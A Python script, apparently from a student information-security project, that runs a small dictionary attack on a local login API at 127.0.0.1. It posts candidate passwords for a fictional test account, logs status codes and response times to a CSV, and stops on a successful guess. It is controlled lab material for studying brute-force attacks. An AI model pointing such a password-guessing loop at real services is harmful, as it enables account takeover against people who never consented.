
"""
API Dictionary Attack Test
CS2413 - Information Security Final Project

Controlled testing against the local authentication API.
Uses fictional test credentials only.
"""

import csv
import json
import time
import urllib.error
import urllib.request
from pathlib import Path

# Local authentication API
LOGIN_URL = "http://127.0.0.1:3000/login"

# Fictional account registered in our local test database
TEST_EMAIL = "testuser@example.com"

# Small dictionary for controlled testing
PASSWORD_CANDIDATES = [
    "password123",
    "admin123",
    "Welcome123!",
    "WrongPassword123!",
    "SecureTestPass2026!"
]

# Output CSV location
BASE_DIR = Path(__file__).resolve().parent.parent
RESULTS_DIR = BASE_DIR / "results"
OUTPUT_FILE = RESULTS_DIR / "api_dictionary_results.csv"


def attempt_login(email, password):
    """Send one login request and measure its response."""

    payload = json.dumps({
        "email": email,
        "password": password
    }).encode("utf-8")

    request = urllib.request.Request(
        LOGIN_URL,
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST"
    )

    start_time = time.perf_counter()

    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            status_code = response.status

    except urllib.error.HTTPError as error:
        status_code = error.code

    except Exception as error:
        print(f"Connection error: {error}")
        return None, None

    elapsed = time.perf_counter() - start_time

    return status_code, elapsed


def run_dictionary_attack():
    RESULTS_DIR.mkdir(parents=True, exist_ok=True)

    results = []
    successful_logins = 0

    print("=" * 55)
    print("API DICTIONARY ATTACK TEST")
    print("=" * 55)

    for attempt_number, password in enumerate(
        PASSWORD_CANDIDATES, start=1
    ):
        status_code, elapsed = attempt_login(
            TEST_EMAIL, password
        )

        if status_code is None:
            print("Test stopped because the API is unavailable.")
            break

        success = status_code == 200

        if success:
            successful_logins += 1

        results.append({
            "attack": "Dictionary",
            "attempt": attempt_number,
            "http_status": status_code,
            "successful_login": success,
            "response_time_seconds": round(elapsed, 6)
        })

        print(
            f"Attempt {attempt_number}: "
            f"HTTP {status_code}, "
            f"Success: {success}, "
            f"Time: {elapsed:.4f}s"
        )

        if success:
            print("\nPassword successfully guessed!")
            break

        time.sleep(0.2)

    with OUTPUT_FILE.open(
        "w", newline="", encoding="utf-8"
    ) as file:
        writer = csv.DictWriter(
            file,
            fieldnames=[
                "attack",
                "attempt",
                "http_status",
                "successful_login",
                "response_time_seconds"
            ]
        )
        writer.writeheader()
        writer.writerows(results)

    print("\n" + "=" * 55)
    print("DICTIONARY ATTACK RESULTS")
    print("=" * 55)
    print(f"Total attempts: {len(results)}")
    print(f"Successful logins: {successful_logins}")
    print(f"Failed attempts: {len(results) - successful_logins}")
    print(f"Results saved to: {OUTPUT_FILE}")


if __name__ == "__main__":
    run_dictionary_attack()